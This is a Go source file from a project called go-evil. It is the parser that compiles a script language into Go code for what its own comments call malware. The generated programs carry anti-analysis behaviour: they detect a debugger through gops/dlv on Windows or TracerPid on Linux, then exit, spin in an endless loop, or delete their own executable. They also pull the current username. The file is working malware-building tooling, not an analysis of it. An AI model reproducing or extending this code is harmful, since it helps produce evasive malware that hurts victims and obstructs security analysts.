package parsing

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

//
//
// preface before we start parsing
//
//
func preface(s_json string) string {
	Check_for_errors(s_json)             // Checks for common errors found in the file
	s_json = Check_configuration(s_json) // Checks for a configuration setting in the file
	s_json = Find_imports(s_json)        // Finds all imports in the file
	s_json = Strip(s_json)               // Removes the configuration section and every comment found
	s_json = Build_functions(s_json)     // Builds function structs for each found function
	return s_json
}

//
//
// This functions binds everything togheter and will generate a complete go code in the structure
//
//
func fill_malware_gut(s_json string) string {
	data_object := structure.Receive(s_json)

	// Link imports
	data_object.Add_malware_line("import (")
	for _, new_import := range data_object.GO_imports {
		data_object.Add_malware_line(new_import)
	}
	data_object.Add_malware_line(")")

	// Link structs
	if len(data_object.GO_struct) > 0 {
		for _, new_struct := range data_object.GO_struct {
			data_object.Add_malware_line(new_struct)
		}
	}

	// Link const
	if len(data_object.GO_const) > 0 {
		data_object.Add_malware_line("const (")
		for _, new_const := range data_object.GO_const {
			data_object.Add_malware_line(new_const)
		}
		data_object.Add_malware_line(")")
	}

	// Link globals
	if len(data_object.GO_global) > 0 {
		for _, new_global := range data_object.GO_global {
			data_object.Add_malware_line(new_global)
		}
	}

	// Link functions
	for _, new_func := range data_object.GO_functions {
		data_object.Add_malware_line(new_func)
	}

	return structure.Send(data_object)
}

//
//
// Generates the main function
//
//
func generate_main_function(s_json string, boot_functions []string, loop_functions []string) string {
	data_object := structure.Receive(s_json)

	// Create the main function here
	main_functions := []string{"func main(){"}

	main_functions = append(main_functions, fmt.Sprintf("runtime_var.roof = %d", data_object.Var_max), "runtime_var.pointer = 0")
	main_functions = append(main_functions, "runtime_var.values = make([]string, runtime_var.roof)")

	for i := 0; i < data_object.Var_max; i++ { // Add default value for each entry
		main_functions = append(main_functions, fmt.Sprintf("runtime_var.values[%d] = \"\"", i))
	}

	// Add boot functions
	for _, boot_name := range boot_functions {
		main_functions = append(main_functions, fmt.Sprintf("%s()", boot_name))
	}

	// Decide the header of the foor loop
	if data_object.Debugger_behavior == "stop" {
		main_functions = append(main_functions, "for !stop_behavior() {")

	} else if data_object.Debugger_behavior == "remove" {
		main_functions = append(main_functions, "for !remove_behavior() {")

	} else if data_object.Debugger_behavior == "none" {
		main_functions = append(main_functions, "for {")

	} else if data_object.Debugger_behavior == "loop" {
		main_functions = append(main_functions, "for !loop_behavior() {")
	}

	// Add loop function
	for _, loop_name := range loop_functions {
		main_functions = append(main_functions, (fmt.Sprintf("%s()", loop_name)))
	}

	main_functions = append(main_functions, "}}")

	data_object.Add_go_function(main_functions)

	return structure.Send(data_object)

}

//
//
// Identify sub function type and populates two string arrays
//
//
func identify_sub_func(d_funcs []structure.Func_t) ([]string, []string) {
	boot_functions := []string{}
	loop_functions := []string{}

	for _, d_func := range d_funcs {

		// Identify the function type
		if d_func.Func_type == "b" {
			boot_functions = append(boot_functions, d_func.Name)

		} else if d_func.Func_type == "l" {
			loop_functions = append(loop_functions, d_func.Name)

		}
	}

	return boot_functions, loop_functions
}

//
//
// Converts each sub function to golang code
//
//
func generate_sub_functions(s_json string) (string, []string, []string) {
	data_object := structure.Receive(s_json)

	boot_func, loop_func := identify_sub_func(data_object.Functions)

	for _, d_func := range data_object.Functions {

		data := []string{fmt.Sprintf("func %s(){", d_func.Name)}

		converted_code, s_json := convert_code(d_func.Gut, structure.Send(data_object))

		data = append(data, converted_code...)

		data = append(data, "}")

		data_object = structure.Receive(s_json)
		data_object.Add_go_function(data)
	}

	return structure.Send(data_object), boot_func, loop_func
}

//
//
// Generates the runtime variable structs
//
//
func generate_runtime_variable_struct(s_json string) string {
	data_object := structure.Receive(s_json)

	data_object.Add_go_struct([]string{
		"type var_t struct {",
		"values  []string",
		"foreach string",
		"roof int",
		"pointer int",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *var_t) set(value string) {",
		"obj.values[obj.pointer] = value",
		"obj.pointer++",
		"if obj.pointer >= obj.roof {",
		"obj.pointer = 0",
		"}}"})

	data_object.Add_go_function([]string{
		"func (obj *var_t) get(line string) string {",
		"regex := regexp.MustCompile(GRAB_VAR)",
		"result := regex.FindAllStringSubmatch(line, -1)",
		"toReturn := line",

		"if len(result) > 0 {",

		"i_number := tools.String_to_int(result[0][1])",
		"if i_number != -1 {",
		"if i_number > 0 && i_number < 5 {",
		"toReturn = obj.get(line)",
		"}else if i_number == 666 { toReturn = tools.Grab_username()",
		"} else if i_number == 42 { toReturn = obj.foreach",
		"} else { toReturn = \"NULL\" }}}",
		"return toReturn }"})

	data_object.Add_go_global("var runtime_var var_t")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
	data_object.Add_go_import("regexp")

	data_object.Add_go_const("GRAB_VAR = \"€([0-9]+)€\"")

	return structure.Send(data_object)
}

//
//
// Generate structs
//
//
func generate_structs(s_json string) string {
	s_json = generate_runtime_variable_struct(s_json)

	return s_json
}

//
//
// Identify the debugger
//
//
func identify_debugger(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func detect_debugger() bool {", "toReturn := false"}

	if data_object.Target_os == "windows" {
		body = append(body,
			"gopsOut, err := exec.Command(\"gops\", strconv.Itoa(os.Getppid())).Output()",
			"if err == nil && strings.Contains(string(gopsOut), \"dlv.exe\") {",
			"toReturn = true",
			"}")

		data_object.Add_go_import("os/exec")
		data_object.Add_go_import("strings")
		data_object.Add_go_import("strconv")

	} else {
		body = append(body,
			"file, err := os.Open(\"/proc/self/status\")",
			"if err == nil {",
			"defer file.Close()",

			"for {",
			"var tpid int",
			"num, err := fmt.Fscanf(file, \"TracerPid: %d\\n\", &tpid)",
			"if err == io.EOF {",
			"break",
			"}",

			"if num != 0{",
			"if tpid != 0{",
			"toReturn = true",
			"}",
			"break",
			"}",

			"}}")

		data_object.Add_go_import("io")
		data_object.Add_go_import("fmt")

	}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)

	return structure.Send(data_object)
}

//
//
// Generate the debugger detection function
//
//
func stop_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func stop_behavior() bool {",
		"toReturn := false",
		"toReturn = identify_debugger()",
		"if toReturn {",
		"os.Exit(42)",
		"}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)
	data_object.Add_go_import("os")

	return structure.Send(data_object)
}

//
//
// Generates the code which will remove the malware
// after it has been launched in a debugger
//
//
func remove_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func remove_behavior() bool {",
		"toReturn := false",
		"toReturn = identify_debugger()",
		"if toReturn {",
		"path := tools.Grab_executable_path()",
		"os.Remove(path)",
		"}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)
	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")

	return structure.Send(data_object)
}

//
//
// Generates the code which will cause the malware to enter an infinite loop
//
//
func loop_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func loop_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"for {",
		"}}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)

	return structure.Send(data_object)
}

//
//
// Generate behavior function for debugging
//
//
func generate_behavior_debugging(s_json string) string {
	data_object := structure.Receive(s_json)
	s_json = identify_debugger(s_json) // Adds neccessary code

	switch data_object.Debugger_behavior {
	case "stop":
		s_json = stop_behavior(s_json)
	case "remove":
		s_json = remove_behavior(s_json)
	case "loop":
		s_json = loop_behavior(s_json)
	}

	return s_json
}

//
//
// Parses the contents of the provided file
//
//
func Parse(s_json string) string {
	s_json = preface(s_json) // Handles every preface we could possibly want done before we start parsing

	s_json = generate_structs(s_json)

	s_json = generate_behavior_debugging(s_json)

	s_json, boot_func, loop_func := generate_sub_functions(s_json)

	s_json = generate_main_function(s_json, boot_func, loop_func)

	s_json = fill_malware_gut(s_json)

	return s_json
}
